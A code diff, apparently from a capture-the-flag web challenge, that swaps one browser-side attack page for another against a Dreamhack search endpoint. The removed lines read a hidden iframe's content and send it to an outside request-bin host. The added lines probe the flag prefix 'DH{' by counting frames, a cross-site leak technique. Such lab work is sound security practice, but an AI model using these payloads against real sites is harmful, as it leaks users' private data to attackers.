@@ -1,21 +1,11 @@
-<iframe id="httpFrame" src="https://skitttles-berry.github.io/static/js/proxy.html?url=http://host1.dreamhack.games:11005/search?query=DreamHack" style="display:none;"></iframe>
-
+<iframe id="iframe"></iframe>
+<img id="img">
 <script>
-window.onload = function() {
-    let iframe = document.getElementById("httpFrame");
-    iframe.onload = function() {
-        try {
-            let preElement = iframe.contentDocument.querySelector("pre");
-            if (preElement) {
-                let resultText = encodeURIComponent(preElement.innerText);
-                location.href = `https://tndjosf.request.dreamhack.games/?result=${resultText}`;
-            } else {
-                location.href = "https://tndjosf.request.dreamhack.games/?result=failed";
-            }
-        } catch (error) {
-            console.error("Error accessing iframe:", error);
-            location.href = "https://tndjosf.request.dreamhack.games/?result=failed";
-        }
-    };
-};
+	let iframe = document.createElement("iframe");
+	iframe.src = "http://host1.dreamhack.games:11005/search?query=DH{";
+	document.body.appendChild(iframe);
+	iframe.onload = ()=>{
+		result = iframe.contentWindow.frames.length;
+		console.log(result);
+	};
 </script>
